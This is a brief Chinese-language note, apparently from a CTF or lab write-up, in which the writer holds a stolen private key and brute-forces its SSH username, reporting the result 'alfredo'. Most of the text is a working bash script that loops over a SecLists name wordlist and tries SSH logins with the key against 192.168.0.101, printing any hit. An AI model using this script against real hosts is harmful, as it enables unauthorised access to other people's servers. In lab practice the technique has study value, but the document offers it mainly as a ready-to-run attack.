拿到一个私钥，于是爆破用户名
群里偷了一个脚本爆破出用户名alfredo

#!/bin/bash

host=192.168.0.101
user_file=/usr/share/seclists/Usernames/Names/names.txt
id_rsa_file=/tmp/aaa


while read i
do
    timeout 1 ssh ${i}@$host -i $id_rsa_file id &>/dev/null
    if [ $? -eq 0 ];then
        echo "[+]Found: $i"
        break
    else
        echo "[-]test:  $i"
    fi
    sleep 0.1
done < $user_file
